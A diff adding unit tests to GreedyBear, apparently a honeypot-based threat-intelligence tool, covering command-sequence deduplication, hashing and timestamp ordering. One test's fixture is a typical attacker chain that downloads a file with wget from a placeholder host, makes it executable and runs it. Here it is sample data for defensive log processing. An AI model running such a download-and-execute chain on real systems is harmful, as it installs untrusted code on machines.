@@ -28,6 +28,7 @@ from greedybear.process_event import (
     _sensor_honeypot_names,
     process_incoming_event,
 )
+from greedybear.utils import hash_command_sequence
 from tests import CustomTestCase, make_api_source, make_sensor, make_user
 
 User = get_user_model()
@@ -358,6 +359,17 @@ class TestProcessCommands(CustomTestCase):
     def test_empty_command_string_skipped(self):
         _process_commands([self._hit("")])
         self.assertEqual(CommandSequence.objects.count(), 0)
+
+    def test_commands_with_whitespace_are_deduplicated(self):
+        cmds = ["ls", "ls ", " ls", "pwd"]
+
+        _process_commands([self._hit(c) for c in cmds])
+
+        seq = CommandSequence.objects.first()
+
+        expected = ["ls", "pwd"]
+        self.assertEqual(seq.commands, expected)
+        self.assertEqual(seq.commands_hash, hash_command_sequence(expected))
 
 
 class TestProcessIncomingEvent(CustomTestCase):
@@ -694,6 +706,57 @@ class TestProcessIncomingEvent(CustomTestCase):
         self.assertIn("invalid after normalization", self.batch.last_error)
 
         self.assertEqual(self.batch.ioc_count, 0)
+
+    @patch(PATCH_UPDATE_SCORES)
+    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
+    @patch(PATCH_IOC_PROCESSOR)
+    @patch(PATCH_IOCS_FROM_HITS)
+    def test_command_sequence_preserves_event_timestamp_order(
+        self,
+        mock_hits,
+        mock_processor_cls,
+        mock_attack,
+        mock_scores_cls,
+    ):
+        base_time = timezone.now()
+
+        commands = [
+            "cd /tmp",
+            "wget http://example.invalid/mal",
+            "chmod +x mal",
+            "./mal",
+        ]
+
+        for command, offset in zip(commands, (0, 1, 1, 2), strict=True):
+            self._make_raw(
+                src_ip="5.6.7.8",
+                command=command,
+                timestamp=base_time + timedelta(seconds=offset),
+            )
+
+        saved_ioc = self._mock_ioc("5.6.7.8")
+
+        mock_hits.return_value = [make_ioc("5.6.7.8")]
+
+        processor_instance = MagicMock()
+        processor_instance.add_ioc.return_value = saved_ioc
+        mock_processor_cls.return_value = processor_instance
+
+        mock_scores_cls.return_value = MagicMock()
+
+        process_incoming_event(
+            self.api_source.id,
+            self.batch.task_id,
+        )
+
+        expected_hash = hash_command_sequence(commands)
+        sequence = CommandSequence.objects.get(commands_hash=expected_hash)
+
+        self.assertEqual(sequence.commands, commands)
+        self.assertEqual(sequence.commands_hash, expected_hash)
+
+        self.batch.refresh_from_db()
+        self.assertEqual(self.batch.status, "completed")
 
 
 class TestProcessArrayField(CustomTestCase):
